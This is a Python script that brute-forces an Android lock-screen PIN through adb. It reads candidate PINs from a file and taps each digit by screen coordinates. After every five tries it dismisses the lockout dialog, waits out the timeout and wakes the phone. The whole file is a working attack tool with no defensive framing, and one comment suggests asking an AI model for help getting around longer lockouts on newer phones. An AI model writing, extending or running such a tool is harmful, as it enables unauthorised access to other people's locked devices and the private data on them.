import time
import subprocess

# Define the keybinds as a dictionary for easier access
keybinds = {
    'WAKE_UP': 'adb shell input keyevent 26', #remove this if screen doesn't turn off on 30s expiral
    'NUMBER_1': 'adb shell input tap 200 700', #you should modify these
    'NUMBER_2': 'adb shell input tap 400 700',
    'NUMBER_3': 'adb shell input tap 600 700',
    'NUMBER_4': 'adb shell input tap 200 800',
    'NUMBER_5': 'adb shell input tap 300 800',
    'NUMBER_6': 'adb shell input tap 600 800',
    'NUMBER_7': 'adb shell input tap 200 1000',
    'NUMBER_8': 'adb shell input tap 420 1000',
    'NUMBER_9': 'adb shell input tap 600 1000',
    'NUMBER_0': 'adb shell input tap 420 1100',
    'ENTER': 'adb shell input tap 520 1100',
    'CLOSE_DIALOG': 'adb shell input keyevent 66',
}

def execute_command(command):
    result = subprocess.run(command, shell=True)
    if result.returncode != 0:
        raise RuntimeError(f"Command '{command}' failed with return code {result.returncode}")
    time.sleep(1.8)  # Wait for 2 seconds between each command, since adb has some delay

def try_pin(pin):
    print(f"Trying pin code: {pin}")
    for digit in pin:
        execute_command(keybinds[f'NUMBER_{digit}'])
    print(f"Entered.")
    execute_command(keybinds['ENTER'])

def main():
    attempts = 0

    with open("pin.txt", "r") as f:
        pins = f.readlines()

    for pin in pins:
        pin = pin.strip()  # Remove any leading/trailing whitespace
        try_pin(pin)
        attempts += 1

        if attempts == 5:
            # Close the dialog box after 5 attempts
            print(f"Pressing key: CLOSE_DIALOG (x2)")
            execute_command(keybinds['CLOSE_DIALOG'])
            execute_command(keybinds['CLOSE_DIALOG'])

            # Some modern phones increment the time, so this script probably won't work. Ask Mistral AI to help you.
            print("Waiting for 28.3 seconds...")
            time.sleep(28.3)

            # Wake up the phone
            execute_command(keybinds['WAKE_UP'])
            print("Phone woken up.")
            time.sleep(2.5)  # Wait for 2.5 seconds after waking up the phone

            attempts = 0  # Reset the attempts counter

if __name__ == '__main__':
    main()
